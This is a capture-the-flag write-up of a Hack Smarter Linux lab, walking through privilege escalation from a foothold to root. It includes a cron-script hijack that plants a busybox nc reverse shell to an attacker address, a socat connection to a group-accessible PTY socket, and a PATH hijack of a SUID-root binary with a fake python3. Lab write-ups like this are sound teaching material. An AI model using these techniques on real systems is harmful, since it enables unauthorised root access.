$ cat banksmarter.md

Hack Smarter · Medium · Linux privilege escalation

Hack Smarter labs rotate their target IPs on redeploy, so swap any address here for whatever your instance shows. This one is a Medium Linux box, and the whole thing turns on one idea people get wrong constantly: a non-root SUID binary hands you euid, and nothing else — no capabilities, no supplementary groups. Every wall on this machine is a group wall, and euid does not open group walls.

$ the setup

We come in with a foothold as layne.stanley and one interesting artifact: a SUID binary at /tmp/bash, owned by scott.weiland (uid 1002). 

id
# uid=1001(layne.stanley) gid=1001(layne.stanley) groups=1001(layne.stanley)

ls -l /tmp/bash
# -rwsr-xr-x 1 scott.weiland scott.weiland ... /tmp/bash

/tmp/bash -p
id
# uid=1001(layne.stanley) euid=1002(scott.weiland) groups=1001(layne.stanley)

So we can act as scott's uid. The obvious next target is /opt/bank — and this is where the box lays its trap: 

ls -ld /opt/bank
# drwxr-x--- root bank-team 750 /opt/bank

Mode 750, owned root:bank-team. Read and execute go to the bank-team group — not to scott's uid. And /tmp/bash -p gave us euid 1002 with groups=1001. The door stays shut.

$ the bug

The single unstated assumption worth naming: a SUID bit owned by a non-root user elevates only the effective user ID. It does not change your group set and grants no Linux capabilities. I burned real time here trying to force scott's groups through the euid — syscall tricks via Python, setpriv-style manoeuvres — and none of it works, because the kernel never handed this process scott's groups in the first place. You cannot elevate into a group you were never granted.

When the barrier is a group barrier, you don't need the next user's uid — you need the next user's session, with their full group set. That reframes the entire box: at every hop, “get a real shell as the next user” beats “fake the next user's uid.”

$ hop 1 — a real session as scott

scott runs a backup script from cron, and layne can write to it: 

ls -l /home/layne.stanley/bankSmarter_backup.sh
# -rwxrwxr-x 1 scott.weiland layne.stanley ... bankSmarter_backup.sh

Owned by scott, writable by layne, executed by scott on a schedule. A textbook cron hijack. Overwrite it with a reverse shell back to the Hack Smarter VPN interface: 

cat > /home/layne.stanley/bankSmarter_backup.sh <<'EOF'
#!/bin/bash
busybox nc <TUN1_IP> 4445 -e /bin/bash
EOF

Catch it on the attacker box: 

nc -lvnp 4445

When cron fires we land as scott — and this time it's a real login context, so the group set is complete: 

id
# uid=1002(scott.weiland) groups=1002,bank-team,ronnie.stone,tmuxshare,tmuxshared

bank-team is ours now. /opt/bank opens.

$ hop 2 — ronnie.stone via a unix socket

Inside /opt/bank there's a socket with a PTY server running as ronnie.stone: 

ls -l /opt/bank/sockets/
# srw-rw---- 1 ronnie.stone bank-team ... live.sock

live.sock is group-bank-team accessible — which we now are. A pty_server.py owned by ronnie is listening on it. Connect straight through with socat: 

socat stdio unix-connect:/opt/bank/sockets/live.sock
id
# uid=1003(ronnie.stone) groups=1003,bankers ...

We've jumped to ronnie and picked up the bankers group.

$ hop 3 — root via PATH hijack

The final gate is a SUID-root binary restricted to the bankers group: 

ls -l /usr/local/bin/bank_backupd
# -rwsr-x--- 1 root bankers 4750 /usr/local/bin/bank_backupd

It invokes a helper through #!/usr/bin/env python3 — i.e. it resolves python3 from $PATH while running as root. That is the whole vulnerability. Plant a fake python3 earlier in the path: 

mkdir -p /dev/shm/x
printf '#!/bin/bash\n/bin/bash -p\n' > /dev/shm/x/python3
chmod +x /dev/shm/x/python3

PATH=/dev/shm/x:$PATH /usr/local/bin/bank_backupd
id
# uid=1003(ronnie.stone) euid=0(root) ...  ->  bash -p  ->  root

$ flag

/root/root.txt on this box isn't a hash — it's a base64-encoded thank-you note from the author. Decode it and you're done: 

cat /root/root.txt | base64 -d
# "Thanks for doing the machine..."  (author's message)

$ gotchas

  • Don't stage in /tmp. An earlier attempt left /tmp/python3 owned by layne, which blocked ronnie from writing there later. /dev/shm/x/ sidesteps ownership collisions between hops.
  • Raw socat shells have no PTY. Pasting multiple lines causes command concatenation and silent failures — submit one command at a time, or upgrade with python3 -c 'import pty;pty.spawn("/bin/bash")'.
  • Point the callback at the right tunnel. With multiple VPNs up, make sure the reverse shell targets the Hack Smarter fabric interface, not an unrelated tun.

$ takeaway

Every hop here was a group boundary, and the mistake that stalls people is reaching for euid to cross them. euid crosses user boundaries; to cross a group boundary you need a genuine session that carries the group set. In a real environment this is the difference between a service account that merely runs as a user and one that has actually inherited that user's group memberships — the second is the one that pivots.
